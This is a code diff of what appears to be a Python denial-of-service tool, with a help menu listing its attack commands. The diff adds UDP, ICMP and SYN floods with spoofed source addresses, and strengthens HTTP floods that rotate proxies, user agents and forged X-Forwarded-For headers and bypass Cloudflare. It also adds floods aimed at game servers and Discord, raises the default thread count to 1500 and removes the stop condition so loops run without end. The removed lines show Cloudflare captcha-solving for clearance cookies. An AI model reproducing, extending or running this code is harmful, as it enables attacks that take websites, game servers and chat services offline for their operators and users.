-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get").strip()
+    user_agents = [getuseragent() for _ in range(20)]
+    prebuilt_requests = [
+        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\nUser-Agent: {ua}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"
+        for ua in user_agents
+    ]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def home(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    spoofed_ip = spoof_source_ip()
-    user_agent = getuseragent()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    spoofed_ips = [spoof_source_ip() for _ in range(15)]
+    prebuilt_requests = [
+        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}X-Forwarded-For: {ip}\r\nAccept-Encoding: gzip, deflate, br\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
+        for ip in spoofed_ips
+    ]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def cfbypass(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
-    spoofed_ip = spoof_source_ip()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(20)]
+    spoofed_ips = [spoof_source_ip() for _ in range(20)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n\r\n"
+            prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def tls(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nSec-Ch-Ua: \"Chromium\";v=\"{Intn(90, 120)}\", \"Not;A=Brand\";v=\"8\"\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    prebuilt_requests = [
+        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}Accept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Ch-Ua: \"Chromium\";v=\"{random.randint(90, 120)}\", \"Not;A=Brand\";v=\"8\"\r\n\r\n"
+        for _ in range(20)
+    ]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def udp_kill(event, proxy_type, target_ip, target_port):
+    global proxies
+    payloads = [
+        generate_random_payload(1024),
+        generate_random_payload(2048),
+        generate_random_payload(4096),
+        b"FUCKYOU" * 512,
+    ]
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+            proxy_ip, proxy_port = proxy.split(":")
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            s.settimeout(2)
+            for _ in range(2000):
+                payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
+                s.sendto(payload, (target_ip, target_port))
+                s.bind((source_ip, Intn(1024, 65535)))
             s.close()
         except:
             if s:
                 s.close()
 
 def ovh(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
-    spoofed_ip = spoof_source_ip()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(25)]
+    spoofed_ips = [spoof_source_ip() for _ in range(25)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\nSec-Ch-Ua-Platform: \"Windows\"\r\nSec-Ch-Ua-Mobile: ?0\r\n\r\n"
+            prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def dgb(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
-    spoofed_ip = spoof_source_ip()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nOrigin: https://{target}\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(30)]
+    spoofed_ips = [spoof_source_ip() for _ in range(30)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nOrigin: https://{target}\r\n\r\n"
+            prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def http_storm(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
     methods = ["GET", "HEAD", "OPTIONS"]
+    prebuilt_requests = []
+    for method in methods:
+        for ua in user_agents:
+            for ip in spoofed_ips:
+                modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+                request = f"{method} {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: no-cors\r\nPriority: u=0, i\r\n\r\n"
+                prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            user_agent = getuseragent()
-            spoofed_ip = spoof_source_ip()
-            header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\n"
-            if cookies:
-                header += f"Cookie: {cookies}\r\n"
-            for _ in range(1000):
-                method = Choice(methods)
-                request = f"{method} {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def api_killer(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("post")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
     payloads = [
-        f'{{"data":"{random.choices(strings, k=1000)}"}}',
-        f'{{"query":"{random.choices(strings, k=500)}"}}',
+        '{"data": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=1000)) + '"}',
+        '{"query": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=500)) + '"}',
+        '{"input": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=1500)) + '"}'
     ]
+    prebuilt_requests = []
+    for payload in payloads:
+        for ua in user_agents:
+            for ip in spoofed_ips:
+                modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+                request = f"POST {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nContent-Type: application/json\r\nContent-Length: {len(payload)}\r\nAccept: application/json\r\nOrigin: https://{target}\r\n\r\n{payload}"
+                prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            user_agent = getuseragent()
-            spoofed_ip = spoof_source_ip()
-            payload = Choice(payloads)
-            header = f"User-Agent: {user_agent}\r\nAccept: application/json\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nContent-Type: application/json\r\nContent-Length: {len(payload)}\r\n"
-            if cookies:
-                header += f"Cookie: {cookies}\r\n"
-            for _ in range(1000):
-                request = f"POST {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n{payload}"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def icmp_blast(event, proxy_type, target_ip, target_port):
+    global proxies
+    payloads = [
+        generate_random_payload(64),
+        generate_random_payload(128),
+        generate_random_payload(256),
+    ]
+    spoofed_sources = [spoof_source_ip() for _ in range(100)]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            proxy_ip, proxy_port = proxy.split(":")
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.settimeout(2)
+            for _ in range(2000):
+                payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
+                icmp_packet = (
+                    b"\x08\x00" +
+                    b"\x00\x00" +
+                    os.urandom(4) +
+                    payload
+                )
+                s.sendto(icmp_packet, (target_ip, 0))
+                s.bind((source_ip, Intn(1024, 65535)))
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def syn_strike(event, proxy_type, target_ip, target_port):
+    global proxies
+    spoofed_sources = [spoof_source_ip() for _ in range(100)]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            for _ in range(2000):
+                source_ip = Choice(spoofed_sources)
+                s.bind((source_ip, Intn(1024, 65535)))
+                s.connect((target_ip, target_port))
+                s.send(b"\x00" * 20)
             s.close()
         except:
             if s:
@@ -836,20 +1098,29 @@ def game_crash(event, proxy_type, target_ip, target_port):
     payloads = [
         b"\xFF\xFF\xFF\xFF" + os.urandom(32),
         b"\x00\x00" + os.urandom(64),
+        b"\xFE\xFD" + os.urandom(16),
     ]
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
             proxy_ip, proxy_port = proxy.split(":")
-            if proxy_type == 5:
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
+            elif proxy_type == 5:
                 s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
-            s.settimeout(0.5)
-            for _ in range(1000):
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.settimeout(2)
+            for _ in range(2000):
                 payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
                 s.sendto(payload, (target_ip, target_port))
+                s.bind((source_ip, Intn(1024, 65535)))
             s.close()
         except:
             if s:
@@ -860,17 +1131,26 @@ def lobby_flood(event, proxy_type, target_ip, target_port):
     payloads = [
         b"\x01\x00" + os.urandom(16),
         b"\x02\x00" + os.urandom(32),
+        b"\x00\x01" + os.urandom(64),
     ]
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((target_ip, target_port))
-            for _ in range(1000):
+            for _ in range(2000):
                 payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
+                s.bind((source_ip, Intn(1024, 65535)))
                 s.send(payload)
+                if random.random() < 0.05:
+                    s.close()
+                    s = setup_socket(proxy_type, proxy)
+                    s.connect((target_ip, target_port))
             s.close()
         except:
             if s:
@@ -881,16 +1161,21 @@ def discord(event, proxy_type, target_ip, target_port):
     payloads = [
         b"\x00\x00" + os.urandom(128),
         b"\xFF\xFF" + os.urandom(64),
+        b"\x01\x01" + os.urandom(256),
     ]
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((target_ip, target_port))
-            for _ in range(1000):
+            for _ in range(2000):
                 payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
+                s.bind((source_ip, Intn(1024, 65535)))
                 s.send(payload)
             s.close()
         except:
@@ -899,6 +1184,9 @@ def discord(event, proxy_type, target_ip, target_port):
 
 def spoof_source_ip():
     return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"
+
+def generate_random_payload(size):
+    return os.urandom(size)
 
 def parse_discord_link(link):
     try:
@@ -923,7 +1211,7 @@ def Launch(method, url, threads, duration, proxy_type, port=None):
 {Colorate.Horizontal(Colors.cyan_to_blue, "┌───────────────────────────────────────────┐")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴀᴛᴛᴀᴄᴋ ꜱᴜᴍᴍᴀʀʏ
 {Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http_storm', 'api_killer'] else url).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else url).ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴍᴏᴅᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚙️     ➤")}  {method.ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⌛    ➤")}  {str(duration).ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "⚔   ➤")}  {str(threads).ljust(30)}
@@ -931,7 +1219,7 @@ def Launch(method, url, threads, duration, proxy_type, port=None):
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ꜰ {Colorate.Horizontal(Colors.cyan_to_blue, "☣  ➤")}  {out_file.ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ɢɪᴛʜᴜʙ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://github.com/Sakuzuna/
-{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http_storm', 'api_killer'] else url)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else url)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "└───────────────────────────────────────────┘")}""")
 
     if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "game-crash", "lobby-flood"]:
@@ -962,7 +1250,7 @@ def main():
     global proxies, thread_num, out_file
     proxies = []
     out_file = "proxies.txt"
-    thread_num = 300
+    thread_num = 1500
 
     clearcs()
     bannerm()
@@ -987,7 +1275,6 @@ def main():
                     runbanner()
 
         if command == "help":
-            clearcs()
             print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("COMMANDS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}exit              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Exit the tool
@@ -1007,87 +1294,84 @@ def main():
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .game <method> <ip>[:port] <threads> <duration> [port]      {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run GAME attack 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .discord <link> <threads> <duration> [port]                 {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run DISCORD tcp flood
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .connect                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Minecraft bot flood with GUI interface [Just input .connect]
 """)
 
         elif command == "methods":
-            clearcs()
             print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity UDP flood with spoofed IPs.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tcpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive TCP SYN flood with spoofed IPs.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
